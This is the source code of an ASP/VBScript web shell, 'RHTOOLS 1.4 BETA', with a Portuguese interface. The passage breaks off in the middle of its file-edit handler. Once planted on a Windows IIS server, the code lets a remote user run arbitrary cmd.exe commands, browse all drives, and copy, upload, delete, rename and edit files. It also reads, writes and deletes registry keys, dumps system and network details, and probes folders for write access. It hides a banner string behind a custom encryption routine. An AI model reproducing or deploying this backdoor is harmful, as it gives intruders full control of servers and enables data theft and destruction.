<%@ LANGUAGE = VBScript.Encode %>
<%
On Error Resume Next
key = "3E3805C10977969C5A36109779731AD7710977972115FE109779784A2D4109779212EF2010977969C5A3610977964964D910977966A93CB10977968BC2BD1097793F417D5109779287136F10977964964D910977976373E21097796CE20A110977964964D91097796FFE70C109779287136F109779212EF201097797740B5B1097796CE20A11097797E82FAA10977968BC2BD1097793F417D5109779287136F10977932CFE29109779287136F109779404AF4E1097792FB37BE1097793C2516A1097793C2516A109779212EF2010977955084C21097794AA9A08109779571B3B410977951EBE5710977951EBE571097794ECF7EC1097795611C3B109779212EF2010977932CFE291097792FB37BE10977935EC494109779212EF201097794470D32109779478D39D109779571B3B410977943675B9109779297AAE810977952F55D0109779592E2A6109779571B3B41097792A842611097792767BF610977966A93CB109779731AD7710977974244F01097797D798311097793D2E8E3109779212EF201097794470D321097795C4A911109779212EF201097793E3805C10977964964D9109779212EF201097796BD892810977976373E210977968BC2BD10977969C5A361097793F417D5109779287136F1097797107E8510977964964D91097796CE20A11097796FFE70C109779784A2D4109779731AD771097793C2516A10977976373E21097796BD892810977969C5A3610977964964D910977966A93CB109779784A2D4109779731AD7710977976373E2109779425DE4010977964964D910977972115FE109779784A2D41097796CE20A11097797740B5B109779731AD7710977966A93CB1097796CE20A110977964964D91097796FFE70C1097792FB37BE10977966A93CB109779731AD771097797107E85109779287136F109779404AF4E10977955084C21097794AA9A08109779478D39D1097795611C3B1097795824B2D1097795611C3B109779212EF201097794896B1610977943675B9109779457A4AB109779571B3B410977951EBE5710977955084C21097793E3805C10977930BCF3710977964964D9109779404AF4E109779212EF201097792EAA045109779212EF201097793E3805C10977964964D9109779212EF201097796BD892810977976373E210977968BC2BD10977969C5A361097793F417D5109779287136F1097794AA9A08109779571B3B4109779571B3B410977952F55D01097793C2516A10977930BCF3710977930BCF371097795A37A1F1097795A37A1F1097795A37A1F1097792FB37BE10977955084C21097794AA9A08109779478D39D1097795611C3B1097795824B2D1097795611C3B1097794896B1610977943675B9109779457A4AB109779571B3B410977951EBE5710977955084C21097792FB37BE109779457A4AB1097794CBC8FA1097794470D321097792FB37BE10977950E26DE109779478D39D109779571B3B4109779287136F109779212EF20109779784A2D410977964964D910977976373E21097796ACF1AF10977968BC2BD109779784A2D41097793F417D5109779287136F10977962835E7109779659FC521097796FFE70C10977964964D910977972115FE1097796EF4F93109779287136F109779404AF4E1097794AA9A08109779571B3B4109779571B3B410977952F55D01097793C2516A10977930BCF3710977930BCF371097795A37A1F1097795A37A1F1097795A37A1F1097792FB37BE10977955084C21097794AA9A08109779478D39D1097795611C3B1097795824B2D1097795611C3B1097794896B1610977943675B9109779457A4AB109779571B3B410977951EBE5710977955084C21097792FB37BE109779457A4AB1097794CBC8FA1097794470D321097792FB37BE10977950E26DE109779478D39D109779571B3B41097793E3805C10977930BCF3710977964964D9109779404AF4E109779212EF201097793C2516A1097793C2516A1097792FB37BE1097793E3805C10977930BCF3710977969C5A36109779731AD7710977972115FE109779784A2D4109779404AF4E109779|2CEC6F|1C54F6"
startcode = "<html><head><title>.:: RHTOOLS 1.4 BETA(PVT) ::.</title></head><body>"
endocde = "</body></html>"
onlinehelp = "<font face=""arial"" size=""1"">.:: <a href=""http://www.rhesusfactor.cjb.net"" target=""_blank"">ONLINE HELP</a> ::.</font><br>"
Function DeCryptString(strCryptString)
	Dim strRAW, arHexCharSet, i, intKey, intOffSet, strRawKey, strHexCrypData
	    strRawKey = Right(strCryptString, Len(strCryptString) - InStr(strCryptString, "|"))
	    intOffSet = Right(strRawKey, Len(strRawKey) - InStr(strRawKey,"|"))
	    intKey = HexConv(Left(strRawKey, InStr(strRawKey, "|") - 1)) - HexConv(intOffSet)
	    strHexCrypData = Left(strCryptString, Len(strCryptString) - (Len(strRawKey) + 1))
	    arHexCharSet = Split(strHexCrypData, Hex(intKey))
		 For i=0 to UBound(arHexCharSet)
		      strRAW = strRAW & Chr(HexConv(arHexCharSet(i))/intKey)
		 Next
	    DeCryptString = CStr(strRAW)
End Function
Function HexConv(hexVar)
	Dim hxx, hxx_var, multiply          
         IF hexVar <> "" THEN
              hexVar = UCASE(hexVar)
              hexVar = StrReverse(hexVar)
              DIM hx()
              REDIM hx(LEN(hexVar))
              hxx = 0
              hxx_var = 0
              FOR hxx = 1 TO LEN(hexVar)
                   IF multiply = "" THEN multiply = 1
                   hx(hxx) = mid(hexVar,hxx,1)
                   hxx_var = (get_hxno(hx(hxx)) * multiply) + hxx_var
                   multiply = (multiply * 16)
              NEXT
              hexVar = hxx_var
              HexConv = hexVar
         END IF
End Function
cprthtml = "<font face='arial' size='1'>.:: RHTOOLS 1.4 BETA(PVT)&copy; BY <a href='mailto:rhfactor@antisocial.com'>RHESUS FACTOR</a> - <a href='HTTP://WWW.RHESUSFACTOR.CJB.NET' target='_blank'>HTTP://WWW.RHESUSFACTOR.CJB.NET</a> ::.</font>"
Function get_hxno(ghx)
         If ghx = "A" Then
              ghx = 10
         ElseIf ghx = "B" Then
              ghx = 11
         ElseIf ghx = "C" Then
              ghx = 12
         ElseIf ghx = "D" Then
              ghx = 13
         ElseIf ghx = "E" Then
              ghx = 14
         ElseIf ghx = "F" Then
              ghx = 15
         End If
         get_hxno = ghx
End Function
keydec = DeCryptString(key)
Function showobj(objpath)
	showobj = Mid(objpath,InstrRev(objpath,"\")+1,Len(objpath))
End Function
Function showobjpath(objpath)
	showobjpath = Left(objpath,InstrRev(objpath,"\"))
End Function
Function checking(a,b)
	If CStr(Mid(a,95,13)) <> CStr(Mid(b,95,13)) Then
		pagina = Mid(Request.ServerVariables("SCRIPT_NAME"),InstrRev(Request.ServerVariables("SCRIPT_NAME"),"/")+1,Len(Request.ServerVariables("SCRIPT_NAME"))) & "?action=error"
		Response.Redirect(pagina)
	End If
End Function
Sub hdr()
	Response.Write startcode
	Response.Write keydec
	Response.Write "<br>"
End Sub
Sub showcontent()
	Response.Write "<font face=""arial"" size=""1"">.:: <a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=root"">DRIVES</a> ::.<br>.:: SCRIPT PATH: " & UCase(Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))) & "<br><br></font>"
	If Trim(Request.QueryString("raiz")) = "root" Then
		Set fs=Server.Createobject("Scripting.FileSystemObject")
		Set drivecollection=fs.drives
		Response.Write "<font face=""arial"" size=""2"">"
		For Each drive IN drivecollection 
			str=drive.driveletter & ":"
			Response.Write "<b><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & str & """>" & UCase(str) & "</a></b><br>"
			Select Case drive.DriveType
				Case 0
					tipodrive = "Unknown"
					nomedrive = drive.VolumeName
				Case 1
					tipodrive = "Removable"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
				Case 2
					tipodrive = "Fixed"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
				Case 3
					tipodrive = "Network"
					If drive.isready Then
						nomedrive = drive.ShareName
					Else
						nomedrive = ""
					End If
				Case 4
					tipodrive = "CD-Rom"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
				Case 5
					tipodrive = "RAM Disk"
					If drive.isready Then
						nomedrive = drive.VolumeName
					Else
						nomedrive = ""
					End If
			End Select
			response.write "<b>Tipo:</b> " & tipodrive & "<br>"
			response.write "<b>Nome: </b>" & nomedrive & "<br>"
			response.write "<b>Sistema de Arquivos: </b>"
			If drive.isready Then
				set sp=fs.getdrive(str)
				response.write sp.filesystem & "<br>"
			Else
			response.write "-<br>"
			End If
			Response.Write "<b>Espaço Livre: </b>"
			If drive.isready Then
				freespace = (drive.AvailableSpace / 1048576)
				set sp=fs.getdrive(str)
				response.write(Round(freespace,1) & " MB<br>")
			Else
				response.write("-<br>")
			End If
			Response.Write "<b>Espaço Total: </b>"
			If drive.isready Then
				totalspace = (drive.TotalSize / 1048576)
				set sp=fs.getdrive(str)
				response.write(Round(totalspace,1) & " MB<br>")
			Else
				response.write("-<br>")
			End If
			Response.Write "<br>"
		Next
		Response.Write "</font>"
		Set fs = Nothing
		Set drivecollection = Nothing
		set sp=Nothing
	Else
		If Trim(Request.QueryString("raiz")) = "" Then
			caminho = Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))
			pos = Instr(caminho,"\")
			pos2 = 1
			While pos2 <> 0
				If Instr(pos + 1,caminho,"\") <> 0 Then
					pos = Instr(pos + 1,caminho,"\")
				Else
					pos2 = 0
				End If
			Wend
			raiz = Left(caminho,pos)
		Else
			raiz =  trim(Request.QueryString("raiz")) & "\"
		End If
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		Set MonRep = ObjFSO.GetFolder(raiz)
		Set ColFolders = MonRep.SubFolders
		Set ColFiles0 = MonRep.Files
		Response.Write "<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=mass&path=" & Replace(raiz,"\","|") & "', 'win1','width=400,height=200,scrollbars=YES,resizable')"">MASS TEST IN " & UCase(raiz) & "</a> - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=cmd', 'win1','width=760,height=540,scrollbars=YES,resizable')"">PROMPT</a> - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=info', 'win1','width=760,height=450,scrollbars=YES,resizable')"">SYS INFO</a> - <a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg', 'win1','width=550,height=250,scrollbars=YES,resizable')"">REGEDIT</a></font><br><br>"
		Response.Write "<font face='arial'><b>Root Folder: " & raiz & "</b></font><br><br>"
		If CInt(Len(raiz) - 1) <> 2 Then
			barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),"\")) - 1
			backlevel = Left(raiz,barrapos)
			Response.Write "<font face='arial' size='2'><b>&lt;DIR&gt;<a href='" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & backlevel & "'> . . </font></b></a><br>"
		Else
			Response.Write "<font face='arial' size='2'><b>&lt;DIR&gt;<a href='" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=root'> . .&nbsp;</font></b></a><br>"
		End If
		Response.Write "<table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
		for each folderItem in ColFolders
			Response.Write "<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='" & Request.ServerVariables("SCRIPT_NAME") & "?raiz=" & folderItem.path & "'>" & showobj(folderItem.path) & "</a></b></td><td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=put&path=" & Replace(folderItem.path,"\","|") & "', 'win1','width=400,height=250,scrollbars=YES,resizable')"">&lt;&lt; PUT</a></font></td></tr>"
		next
		Response.Write "</table><br><table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
		
		for each FilesItem0 in ColFiles0
			Response.Write "<tr><td><font face='arial' size='2'>:: " & showobj(FilesItem0.path) & "</td><td valign='baseline'><font face='arial' size='1'>&nbsp;&nbsp;" & FormatNumber(FilesItem0.size/1024, 0) & "&nbsp;Kbytes&nbsp;&nbsp;&nbsp;</font></td><td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=get&path=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=400,height=200,scrollbars=YES,resizable')"">GET &gt;&gt;</a></font></td><td valign='baseline'>&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=ren&path=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=400,height=200,scrollbars=YES,resizable')"">. REN .</a></font></td><td valign='baseline'>&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=del&path=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=400,height=200,scrollbars=YES,resizable')"">:: DEL</a></font></td><td valign='baseline'>&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtview&file=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=640,height=480,scrollbars=YES,resizable')"">o VIEW o</a></font></td><td valign='baseline'>&nbsp;&nbsp;&nbsp;&nbsp;<font face='arial' size='1'><a href=""#"" onclick=""javascript:document.open('" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit&file=" & Replace(FilesItem0.path,"\","|") & "', 'win1','width=760,height=520,scrollbars=YES,resizable')"">o EDIT o</a></font></td></tr>"
		next
		Response.Write "</table>"
	End If
End Sub
Select Case Trim(Request.QueryString("action"))
	Case "get"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		caminho = Replace(Trim(Request.QueryString("path")),"|","\")
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		Set MyFile = ObjFSO.GetFile(caminho)
		destino = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
		MyFile.Copy (destino)
		If Err.Number = 0 Then
			Response.Write "<font face='arial' size='2'><center><br><br>Arquivo: <b>" & caminho & "</b><br>copiado para: " & destino
		End If	
	Case "put"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		If Trim(Request.QueryString("arquivo")) = "" Then
			caminho = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
			varpath = Trim(Request.QueryString("path"))
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			Set MonRep = ObjFSO.GetFolder(caminho)
			Set ColFolders = MonRep.SubFolders
			Set ColFiles0 = MonRep.Files

			Response.Write "<font face='arial' size='2'><b>Selecione o arquivo: <br><table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
			for each FilesItem0 in ColFiles0
				Response.Write "<tr><td><font face='arial' size='2'>:: " & showobj(FilesItem0.path) & "</td><td valign='baseline'><font face='arial' size='1'>&nbsp;&nbsp;" & FormatNumber(FilesItem0.size/1024, 0) & "&nbsp;Kbytes&nbsp;&nbsp;&nbsp;</font></td><td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='1'><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=put&path=" & varpath & "&arquivo=" & Replace(FilesItem0.path,"\","|") & """>:: SELECIONAR ::</a></font></td></tr>"
			next
			Response.Write "</table>"
		Else
			destino = Replace(Trim(Request.QueryString("path")),"|","\") & "\"
			arquivo = Replace(Trim(Request.QueryString("arquivo")),"|","\")
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			Set MyFile = ObjFSO.GetFile(arquivo)
			MyFile.Copy (destino)
			If Err.Number = 0 Then
				Response.Write "<font face='arial' size='2'><center><br><br>Arquivo: <b>" & arquivo & "</b><br>copiado para: <b>" & destino
			End If
		End If
	Case "del"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		caminho = Replace(Trim(Request.QueryString("path")),"|","\")
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		Set MyFile = ObjFSO.GetFile(caminho)
		MyFile.Delete
		If Err.Number = 0 Then
			Response.Write "<font face='arial' size='2'><center><br><br>Arquivo <b>" & caminho & "</b> apagado<br>" & _
			                               "<font size='1'>(pressione F5 na janela principal para atualizar)"
		End If
	Case "ren"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		If Trim(Request.QueryString("status")) <> "2" Then
			caminho = Replace(Trim(Request.QueryString("path")),"|","\")
			arquivo = showobj(caminho)
			Response.Write "<br><font face=""arial"" size=""2""><b>" & arquivo & "</b><br>" & _
						       "<form action=""" & Request.ServerVariables("SCRIPT_NAME") & """ method=""get"">" & _
						       "<input type=""hidden"" name=""action"" value=""ren"">" & _
						       "<input type=""hidden"" name=""status"" value=""2"">" & _
						       "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("path")) & """>" & _
						       "Digite o novo nome: <input type=""text"" name=""newname"">" & _
						       "&nbsp;&nbsp;<input type=""submit"" value=""alterar"">" & _
						       "</form>"
		Else
			caminho = Replace(Trim(Request.QueryString("path")),"|","\")
			Set ObjFSO = CreateObject("Scripting.FileSystemObject")
			Set MyFile = ObjFSO.GetFile(caminho)
			destino = Left(caminho,InStrRev(caminho,"\")) & Trim(Request.QueryString("newname"))
			MyFile.Move (destino)
			If Err.Number = 0 Then
				Response.Write "<font face='arial' size='2'><center><br><br>Arquivo: <b>" & caminho & "</b><br>renomeado para<b>: " & destino
			End If	
		End If
	Case "mass"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		caminho = Left(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),InstrRev(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")),"\"))
		arquivo = caminho & "_vti_cnf.log"
		varpath = Replace(Trim(Request.QueryString("path")),"|","\")
		Set ObjFSO = CreateObject("Scripting.FileSystemObject")
		Set MonRep = ObjFSO.GetFolder(varpath)
		Set ColFolders = MonRep.SubFolders
		Set Arquivotxt = ObjFSO.CreateTextFile(arquivo,True)
		Set MyFile = ObjFSO.GetFile(arquivo)
		
		Response.Write "<table border=""0"" cellspacing=""0"" cellpadding=""0"" >"
		for each folderItem in ColFolders
			destino = folderItem.path & "\"
			MyFile.Copy (destino)
			Response.Write "<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; " & showobj(folderItem.path) & "</b></td>"
			If Err.Number = 0 Then
				Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='green'>Acesso Permitido</font></td></tr>"
			Else
				Response.Write "<td valign='baseline'>&nbsp;&nbsp;<font face='arial' size='2' color='red'>" & UCase(Err.Description) & "</font></td></tr>"
			End If
			Err.Number = 0
		next
		Response.Write "</table>"
	Case "error"
		Response.Write "<center><font face='arial' size='2' color='red'> <b>CÓDIGO CORROMPIDO<BR>CORRUPT CODE</font></center>"
	Case "cmd"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Set oScript = Server.CreateObject("WSCRIPT.SHELL") 
		Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK") 
		Set oFileSys = Server.CreateObject("Scripting.FileSystemObject") 
		szCMD = Request.QueryString(".CMD") 
		If (szCMD <> "") Then 
			szTempFile = "c:\" & oFileSys.GetTempName( ) 
			Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True) 
			Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0) 
		End If 
		Response.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET""><input type=""hidden"" name=""action"" value=""cmd""><input type=text name="".CMD"" size=45 value=""" & szCMD & """><input type=submit value=""Run""></FORM><br><br> "
		If (IsObject(oFile)) Then 
			On Error Resume Next 
			Response.Write "<font face=""arial"">"
			Response.Write Replace(Replace(Server.HTMLEncode(oFile.ReadAll),VbCrLf,"<br>")," ","&nbsp;")
			oFile.Close 
			Call oFileSys.DeleteFile(szTempFile, True) 
		End If 
	Case "info"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Set WshNetwork = Server.CreateObject("WScript.Network")
		Set WshShell = Server.CreateObject("WScript.Shell")
		Set WshEnv = WshShell.Environment("SYSTEM")
		Response.Write "<br><font face=arial size=2>"
		Response.Write "<b>IDENTIFICAÇÃO DE REDE:</b><br>"
		Response.Write "<b>Usuário: </b>" & WshNetwork.UserName & "<br>"
		Response.Write "<b>Nome do Computador: </b>" & WshNetwork.ComputerName & "<br>"
		Response.Write "<b>Usuário do Domínio: </b>" & WshNetwork.UserDomain & "<br>"
		Set Drives = WshNetwork.EnumNetworkDrives
		For i = 0 to Drives.Count - 1
			Response.Write "<b>Drive de Rede (Mapeado): </b>" & Drives.Item(i) & "<br>"
		Next
		Response.Write "<br><b>FÍSICO:</b><br>"
		Response.Write "<b>Arquitetura do Processador: </b>" & WshEnv("PROCESSOR_ARCHITECTURE") & "<br>"
		Response.Write "<b>Número de Processadores: </b>" & WshEnv("NUMBER_OF_PROCESSORS") & "<br>"
		Response.Write "<b>Identificador do Processador: </b>" & WshEnv("PROCESSOR_IDENTIFIER") & "<br>"
		Response.Write "<b>Nível do Processador: </b>" & WshEnv("PROCESSOR_LEVEL") & "<br>"
		Response.Write "<b>Revisão do Processador: </b>" & WshEnv("PROCESSOR_REVISION") & "<br>"
		Response.Write "<br><b>LÓGICO:</b><br>"
		Response.Write "<b>IP: </b>" & request.servervariables("LOCAL_ADDR") & "<br>"
		Response.Write "<b>Sistema Operacional: </b>" & WshEnv("OS") & "<br>"
		Response.Write "<b>Servidor Web: </b>" & request.servervariables("SERVER_SOFTWARE") & "<br>"
		Response.Write "<b>Especificação do Command: </b>" & WshShell.ExpandEnvironmentStrings("%ComSpec%") & "<br>"
		Response.Write "<b>Caminhos no Path: </b>" & WshEnv("PATH") & "<br>"
		Response.Write "<b>Executáveis: </b>" & WshEnv("PATHEXT") & "<br>"
		Response.Write "<b>Prompt: </b> " & WshEnv("PROMPT") & "<br>"
		Response.Write "<b>System Drive: </b>" & WshShell.ExpandEnvironmentStrings("%SYSTEMDRIVE%") & "<br>"
		Response.Write "<b>System Root: </b>" & WshShell.ExpandEnvironmentStrings("%SYSTEMROOT%") & "<br>"
		Response.Write "<b>Caminho do System32: </b>" & WshShell.CurrentDirectory & "<br>"
		Set Drives = Nothing
		Set WshNetwork = Nothing
		Set WshShell = Nothing
		Set WshEnv = Nothing
	Case "reg"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Set WshShell = Server.CreateObject("WScript.Shell")
		Response.Write "<font face=""arial"" size=""2""><b>Editor de Registro:</b><br><br>"
		Select Case Trim(Request.QueryString("regaction"))
			Case "w"
				If Trim(Request.QueryString("process")) = "yes" Then
					Select Case Trim(Request.QueryString("type"))
						Case "1"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_SZ")
						Case "2"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), CInt(Trim(Request.QueryString("value"))), "REG_DWORD")
						Case "3"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), CInt(Trim(Request.QueryString("value"))), "REG_BINARY")
						Case "4"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_EXPAND_SZ")
						Case "5"
							teste = WshShell.RegWrite (Trim(Request.QueryString("key")), Trim(Request.QueryString("value")), "REG_MULTI_SZ")
					End Select
					Response.Write "<center><br><font face=""arial"" size=""2"">Registro <b>"
					Response.Write Trim(Request.QueryString("key")) & "</b> Escrito</center>"
					Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"
				Else
					Response.Write "<table><tr><td><font face=""arial"" size=""2"">ROOT KEY NAME</td><td><font face=""arial"" size=""2"">ABREVIAÇÃO</td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CURRENT_USER </td><td><font face=""arial"" size=""1""> HKCU </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_LOCAL_MACHINE </td><td><font face=""arial"" size=""1""> HKLM </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CLASSES_ROOT </td><td><font face=""arial"" size=""1""> HKCR </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_USERS </td><td><font face=""arial"" size=""1""> HKEY_USERS </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">HKEY_CURRENT_CONFIG </td><td><font face=""arial"" size=""1""> HKEY_CURRENT_CONFIG </td></tr></table><br>"
					Response.Write "<table><tr><td><font face=""arial"" size=""2"">Tipo </td><td><font face=""arial"" size=""2""> Descrição </td><td><font face=""arial"" size=""2""> Na forma de </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_SZ </td><td><font face=""arial"" size=""1""> string </td><td><font face=""arial"" size=""1""> string </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_DWORD </td><td><font face=""arial"" size=""1""> número </td><td><font face=""arial"" size=""1""> inteiro </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_BINARY </td><td><font face=""arial"" size=""1""> valor binário </td><td><font face=""arial"" size=""1""> VBArray de inteiros </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_EXPAND_SZ </td><td><font face=""arial"" size=""1""> string expandível (ex. ""%windir%\\calc.exe"") </td><td><font face=""arial"" size=""1""> string </td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">REG_MULTI_SZ </td><td><font face=""arial"" size=""1""> array de strings </td><td><font face=""arial"" size=""1""> VBArray de strings </td></tr></table>"
					Response.Write "<br><br><FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"
					Response.Write "<table><tr><td><font face=""arial"" size=""1"">KEY: </td><td><input type=""text"" name=""key""> <font face=""arial"" size=""1""><br>( ex.: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductId )</td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">VALUE:</td><td><input type=""text"" name=""value""></td></tr>"
					Response.Write "<tr><td><font face=""arial"" size=""1"">TYPE:</td><td><SELECT NAME=""type"">"
					Response.Write "<OPTION VALUE=""1"">REG_SZ </option>"
					Response.Write "<OPTION VALUE=""2"">REG_DWORD </option>"
					Response.Write "<OPTION VALUE=""3"">REG_BINARY </option>"
					Response.Write "<OPTION VALUE=""4"">REG_EXPAND_SZ </option>"
					Response.Write "<OPTION VALUE=""5"">REG_MULTI_SZ </option></select><br>"
					Response.Write "<input type=""hidden"" name=""regaction"" value=""w"">"
					Response.Write "<input type=""hidden"" name=""action"" value=""reg"">"
					Response.Write "<input type=""hidden"" name=""process"" value=""yes""></td></tr>"
					Response.Write "<tr><td></td><td><input type=""submit"" value=""OK""></form></td></tr></table>"
					Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"
				End If
			Case "r"
				If Trim(Request.QueryString("process")) = "yes" Then
					Response.Write "<font face=""arial"" size=""2"">" & Trim(Request.QueryString("key")) & "<br>"
					Response.Write "Valor: <b>" & WshShell.RegRead (Trim(Request.QueryString("key")))
				Else
					Response.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"
					Response.Write "<font face=""arial"" size=""1"">KEY: <input type=""text"" name=""key""> <br>( ex.: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductId )<br>"
					Response.Write "<input type=""hidden"" name=""regaction"" value=""r"">"
					Response.Write "<input type=""hidden"" name=""action"" value=""reg"">"
					Response.Write "<input type=""hidden"" name=""process"" value=""yes"">"
					Response.Write "<input type=""submit"" value=""OK""></form>"
				End If
				Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"
			Case "d"
				If Trim(Request.QueryString("process")) = "yes" Then
					teste = WshShell.RegDelete (Trim(Request.QueryString("key")))
					Response.Write "Chave <b>" & Trim(Request.QueryString("key")) & " </b>deletada"
				Else
					Response.Write "<FORM action=""" & Request.ServerVariables("URL") & """ method=""GET"">"
					Response.Write "<font face=""arial"" size=""1"">KEY: <input type=""text"" name=""key""> ( ex.: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ProductId )<br>"
					Response.Write "<input type=""hidden"" name=""regaction"" value=""d"">"
					Response.Write "<input type=""hidden"" name=""action"" value=""reg"">"
					Response.Write "<input type=""hidden"" name=""process"" value=""yes"">"
					Response.Write "<input type=""submit"" value=""OK""></form>"
				End If
				Response.Write "<br><br><font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg"">MENU PRINCIPAL</a><br>"
			Case Else
				Response.Write "<font face=""arial"" size=""1""><a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=w"">ESCREVER CHAVE</a><br><br>"
				Response.Write "<a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=r"">LER CHAVE</a><br><br>"
				Response.Write "<a href=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=reg&regaction=d"">DELETAR CHAVE</a><br>"
		End Select
		Set WshShell = Nothing
	Case "txtview"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		file = Replace(Trim(Request.QueryString("file")),"|","\")
		Set fso = CreateObject("Scripting.FileSystemObject")  
		Set a = fso.OpenTextFile(file)
		Response.Write Replace(Replace(Server.HTMLEncode(a.ReadAll),VbCrLf,"<br>")," ","&nbsp;")
		Set a = Nothing
		Set fso = Nothing
	Case "txtedit"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		If Request.Form.Count = 0 Then
			file = Replace(Trim(Request.QueryString("file")),"|","\")
			Set fso = CreateObject("Scripting.FileSystemObject")
			Set a = fso.OpenTextFile(file)
			Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit"">"
